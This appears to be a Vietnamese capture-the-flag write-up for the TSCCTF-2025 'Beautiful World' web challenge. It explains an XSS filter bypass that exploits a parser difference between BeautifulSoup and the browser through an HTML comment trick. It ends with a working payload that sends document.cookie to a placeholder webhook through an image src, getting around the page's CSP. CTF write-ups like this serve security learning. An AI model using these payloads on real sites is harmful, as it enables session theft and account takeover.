# [TSCCTF-2025] Beautiful World
<p>Endpoint /note: dùng để xem nội dung note đã được encode base64. Dòng 31, lấy ra tham số content và decode base64. Sau đó, kiểm tra nếu tồn tại tag khác &lt;s> hoặc chứa các thuộc tính HTML thì return. Ngược lại, render file note.html với nội dung của note là chuỗi sau khi decode base64.</p>

![alt text](/thanhlai/post/web_exploitation/image/post14/image.png)

<p>File note.html: hiển thị nội dung note. Dòng 9, thiết lập CSP quy định khi sử dụng các API như: fetch(), XMLHttpRequest,... chỉ được phép kết nối tới chính nó -> Tóm lại, không cho phép kết nối qua bên ngoài bằng fetch(), XMLHttpRequest,... Dòng 18, autoescape false dùng để tắt cơ chế escape mặc định. Dòng 19, render nội dung note -> Để trigger XSS, cần phải bypass kiểm tra của BeautifulSoup ở phía backend. Do BeautifulSoup và browser có cách phân tích cú pháp HTML khác nhau, có thể lợi dụng sự khác biệt này để không bị phát hiện khi parse bằng BeautifulSoup, nhưng vẫn thực thi trong trình duyệt -> Từ đó có thể khai thác XSS.</p>

![alt text](/thanhlai/post/web_exploitation/image/post14/image-1.png)

<p>
Có một trick để đóng thẻ comment <code>&lt;!--</code> là chèn thêm một dấu <code>&gt;</code>, khiến parser kết thúc phần comment sớm. Sau đó, có thể chèn đoạn mã HTML như <code>&lt;script>alert(1337)&lt;/script></code> để thực thi JavaScript. Trick này lợi dụng việc một số parser HTML như <code>BeautifulSoup</code> không xử lý phần đóng comment giống như browser, dẫn đến việc đoạn script lọt qua kiểm tra backend nhưng vẫn được render và thực thi ở phía người dùng (XSS).</p>

![alt text](/thanhlai/post/web_exploitation/image/post14/image-2.png)

<p>Khi thêm <code>--></code> thì chỉ thêm chuỗi "-->" vào HTML chứ không có gì đặc biệt.</p>

![alt text](/thanhlai/post/web_exploitation/image/post14/image-7.png)

<p>Tuy nhiên, với BeautifulSoup thì khi thêm <code>--></code> thì nó xem <code>&lt;script>alert(1337)&lt;/script></code> là nội dung trong comment -> bypass được việc kiểm tra tag bằng payload <code>&lt;!-->&lt;script>alert(1337)&lt;/script>--></code></p>

![alt text](/thanhlai/post/web_exploitation/image/post14/image-8.png)

<p>Trước hết, cần encode base64 payload.</p>

![alt text](/thanhlai/post/web_exploitation/image/post14/image-3.png)

<p>Sau đó, cần encodeURL payload đã encode base64.</p>

![alt text](/thanhlai/post/web_exploitation/image/post14/image-4.png)

<p>Đưa chuỗi sau khi encode URL vào giá trị của tham số content tại endpoint /note. -> Chèn được tag &lt;script> vào nội dung HTML thành công.</p>

![alt text](/thanhlai/post/web_exploitation/image/post14/image-5.png)

<p>Cuối cùng, thay đổi JS code để gửi cookie ra bên ngoài (sử dụng thuộc tính src để bypass việc kiểm tra của CSP). Payload để gửi cookie ra ngoài: </p>

```
<!--><script>new Image().src = "[your_webhook_link]?cookie=" + document.cookie</script>-->
```

![alt text](/thanhlai/post/web_exploitation/image/post14/image-6.png)